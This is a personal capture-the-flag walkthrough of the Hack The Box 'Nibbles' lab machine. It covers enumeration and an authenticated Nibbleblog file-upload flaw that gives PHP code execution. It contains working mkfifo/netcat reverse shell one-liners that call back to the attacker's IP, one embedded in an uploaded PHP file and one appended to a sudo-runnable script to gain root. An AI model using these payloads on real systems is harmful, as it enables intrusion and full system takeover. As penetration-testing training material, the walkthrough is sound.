##### Parent note:[[HTB - Machines]]

# Getting Started - Nibbles
Author of CTF: Hackthebox.com
Created: 08-Oct-2025
- - -
> [!important] Known facts
> World-writable File / Sudoers Misconfiguration
> OS: Linux
> Web related attack vector.
> "Grey-box"

### Step 1: Basic nmap

```sh title="nmap -sS -sV 10.129.156.53"
Host is up (0.0088s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

>[!question]- Q1: Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)
>Answer: *2.4.18*

### Step 2: Check webpage @ http://10.129.156.53:80
-Wappalyzer can come in handy here.
-Use [[Gobuster & Dirbuster]] or [[_.Fuff]] for enumerating the webpage

check the HTML source, do this in your browser or by using `curl`.
```html title='curl <IP_Address>'
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Good job, you found a directory called *nibbleblog*.
Navigating there show use the page, but nothing really interesting.
A quick Google search for *nibbleblog exploit* yields this [Nibbleblog File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/). The flaw allows an authenticated attacker to upload and execute arbitrary PHP code on the underlying web server.

The *Metasploit* module in question works for version *4.0.3*. We do not know the exact version of *Nibbleblog* in use yet, but it is a good bet that it is vulnerable to this. If we look at the source code of the *Metasploit* module, we can see that the exploit uses user-supplied credentials to authenticate the admin portal at `/admin.php`.

Use Gobuster or FFUF to find other directories and maybe info on the version number for nibbleblog.
`gobuster dir -u http://IP_Address/ -w <Path_to_Wordlist>` or:
```sh title='ffuf -u http://10.129.156.53/nibbleblog/FUZZ -w <Path_To_Wordlist> -c'
 :: Method           : GET
 :: URL              : http://10.129.156.53/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

content                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 6ms]
themes                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 8ms]
admin                   [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 6ms]
plugins                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 7ms]
                        [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 162ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 10ms]
languages               [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 9ms]
                        [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 29ms]
:: Progress: [220559/220559] :: Job [1/1] :: 5000 req/sec :: Duration: [0:00:54] :: Errors: 0 ::

```

It shows multiple pages, but not all are accessible (HTML CODE *301 Moved Permanently*) mean it will redirect.
However this does let you know there is a README page we can access.
Opening http://10.129.156.53/nibbleblog/README gives us a HTML page showing the version of nibbleblog. which confirms the vulnerability we found will work! Hurray!
do remember the page could be old or not updated, but in this case it is correct.
>[!info] HTML snippet
>====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Now, to use the exploit mentioned above, we will need valid admin credentials. 
We can try some authorization bypass techniques and common credential pairs manually, such as `admin:admin` and `admin:password`, to no avail. |
There is a reset password function, but we receive an e-mail error.
Also, too many login attempts too quickly trigger a lockout with the message:
`Nibbleblog security error - Blacklist protection`.

Let us go back to our directory brute-forcing results. The *200* status codes show pages/directories that are directly accessible. The *403* status codes in the output indicate that access to these resources is forbidden. Finally, the *301* is a permanent redirect. Let us explore each of these. Browsing to `nibbleblog/themes/`. We can see that directory listing is enabled on the web application. 
Browsing to `nibbleblog/content` shows some interesting subdirectories *public*, *private*, and *tmp*. Digging around for a while, we find a *users.xml* file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with `cURL` and prettify the *XML* output using [xmllint](https://linux.die.net/man/1/xmllint) or copy from the page as i did.

>[!info]- /nibbleblog/content/private/users.xml
>```xml title=/nibbleblog/content/private/users.xml
><users>
><user username="admin">
><id type="integer">0</id>
><session_fail_count type="integer">0</session_fail_count>
><session_date type="integer">1514544131</session_date>
></user>
><blacklist type="string" ip="10.10.10.1">
><date type="integer">1512964659</date>
><fail_count type="integer">1</fail_count>
></blacklist>
></users>
>```

At this point, we have a valid username but no password. Searches of Nibbleblog related documentation show that the password is set during installation, and there is no known default password. Up to this point, have the following pieces of the puzzle:

- A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability
    
- An admin portal at `nibbleblog/admin.php`
    
- Directory listing which confirmed that *admin* is a valid username
    
- Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as [Hydra](https://github.com/vanhauser-thc/thc-hydra) off the table

Taking another look through all of the exposed directories, we find a `config.xml` file.
>[!info]- /nibbleblog/content/private/config.xml
>```xml
><config>
><name type="string">Nibbles</name>
><slogan type="string">Yum yum</slogan>
><footer type="string">Powered by Nibbleblog</footer>
><advanced_post_options type="integer">0</advanced_post_options>
><url type="string">http://10.10.10.134/nibbleblog/</url>
><path type="string">/nibbleblog/</path>
><items_rss type="integer">4</items_rss>
><items_page type="integer">6</items_page>
><language type="string">en_US</language>
><timezone type="string">UTC</timezone>
><timestamp_format type="string">%d %B, %Y</timestamp_format>
><locale type="string">en_US</locale>
><img_resize type="integer">1</img_resize>
><img_resize_width type="integer">1000</img_resize_width>
><img_resize_height type="integer">600</img_resize_height>
><img_resize_quality type="integer">100</img_resize_quality>
><img_resize_option type="string">auto</img_resize_option>
><img_thumbnail type="integer">1</img_thumbnail>
><img_thumbnail_width type="integer">190</img_thumbnail_width>
><img_thumbnail_height type="integer">190</img_thumbnail_height>
><img_thumbnail_quality type="integer">100</img_thumbnail_quality>
><img_thumbnail_option type="string">landscape</img_thumbnail_option>
><theme type="string">simpler</theme>
><notification_comments type="integer">1</notification_comments>
><notification_session_fail type="integer">0</notification_session_fail>
><notification_session_start type="integer">0</notification_session_start>
><notification_email_to type="string">admin@nibbles.com</notification_email_to>
><notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
><seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
><seo_site_description type="string"/>
><seo_keywords type="string"/>
><seo_robots type="string"/>
><seo_google_code type="string"/>
><seo_bing_code type="string"/>
><seo_author type="string"/>
><friendly_urls type="integer">0</friendly_urls>
><default_homepage type="integer">0</default_homepage>
></config>
>```

Checking it, hoping for passwords proofs fruitless, but we do see two mentions of *nibbles* in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password?

When performing password cracking offline with a tool such as `Hashcat` or attempting to guess a password, it is important to consider all of the information in front of us. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) using a wordlist generated by crawling their website using a tool such as [CeWL](https://github.com/digininja/CeWL).
- - -
- - -
### Next step: Foothold
Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. We know a *Metasploit* module will likely work for this, but let us enumerate the admin portal for other avenues of attack. Looking around a bit, we see the following pages:

| **Page**   | **Contents**                                                                                                                                                           |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Publish`  | making a new post, video post, quote post, or new page. It could be interesting.                                                                                       |
| `Comments` | shows no published comments                                                                                                                                            |
| `Manage`   | Allows us to manage posts, pages, and categories. We can edit and delete categories, not overly interesting.                                                           |
| `Settings` | Scrolling to the bottom confirms that the vulnerable version 4.0.3 is in use. Several settings are available, but none seem valuable to us.                            |
| `Themes`   | This Allows us to install a new theme from a pre-selected list.                                                                                                        |
| `Plugins`  | Allows us to configure, install, or uninstall plugins. The *My image* plugin allows us to upload an image file. Could this be abused to upload `PHP` code potentially? |
Let us attempt to use this plugin to upload a snippet of `PHP` code instead of an image. The following snippet can be used to test for code execution.
```php
<?php system('id'); ?>
```
Save this code to a file and then click on the `Browse` button and upload it.
...
We get a bunch of errors, but it seems like the file may have uploaded.

Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a `plugins` directory and another subdirectory for `my_image`. 
The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. 
In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! 
Let's check and see if we have command execution.
```shell-session title='curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php'
Jurwan10@htb[/htb]$ 
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

We do! It looks like we have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context. Let us modify our PHP file to obtain a reverse shell and start poking around the server.

Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

Let us use the following `Bash` reverse shell one-liner and add it to our `PHP` script.
```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder and a port of our choice for `<LISTENING PORT>` to catch the reverse shell on our `netcat` listener. See the edited `PHP` script below.
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

We upload the file again and start a `netcat` listener in our terminal:
```shell-session
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
```
`cURL` the image page again or browse to it in `Firefox` at http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.

```sh
Jurwan10@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Try the various techniques for upgrading to a full TTY and pick one that works best for you. Our first attempt fails as `Python2` seems to be missing from the system!
```shell-session
$ python -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
```

We have `Python3` though, which works to get us to a friendlier shell by typing `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Browsing to `/home/nibbler`, we find the `user.txt` flag as well as a zip file `personal.zip`.
```shell-session
nibbler@Nibbles:/home/nibbler$ ls

ls
personal.zip  user.txt
```

- - -
- - -
Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the `personal.zip` file and see a file called `monitor.sh`.
```shell-session
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 
```

The shell script `monitor.sh` is a monitoring script, and it is owned by our `nibbler` user and writeable.
```shell-session title='nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh'   
                 #                                        Tecmint_monitor.sh                                        #

                 # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #

                 # If any bug, report us in the link below                                                          #

                 # Free to use/edit/distribute the code below by                                                    #

                 # giving proper credit to Tecmint.com and Author                                                   #

                 #                                                                                                  #

#! /bin/bash

# unset any variable which system may be using

# clear the screen

clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
       case $name in
         i)iopt=1;;
         v)vopt=1;;
         *)echo "Invalid arg";;
       esac
done

 <SNIP>
```

Let us put this aside for now and pull in [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks. First, download the script to your local attack VM and then start a *Python HTTP server* using the command `sudo python3 -m http.server 8080`.
```shell-session title='sudo python3 -m http.server 8080'
Jurwan10@htb[/htb]$ sudo python3 -m http.server 8080
[sudo] password for ben: ***********

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
```

Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the script. If successful, we will see a 200 success response on our Python HTTP server. Once the script is pulled over, type `chmod +x LinEnum.sh` to make the script executable and then type `./LinEnum.sh` to run it. We see a ton of interesting output but what immediately catches the eye are `sudo` privileges.
```shell-session
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```

The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user. Let us edit the `monitor.sh` file to append a reverse shell one-liner.
```shell-session
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```

If we cat the `monitor.sh` file, we will see the contents appended to the end. `It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption.` Execute the script with `sudo`:
```shell-session
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh 
```

Finally, catch the root shell on our waiting `nc` listener.
```shell-session
Jurwan10@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
# id

uid=0(root) gid=0(root) groups=0(root)
```

From here, we can grab the `root.txt` flag.


- - -
##### linked notes: [[]]
##### References:
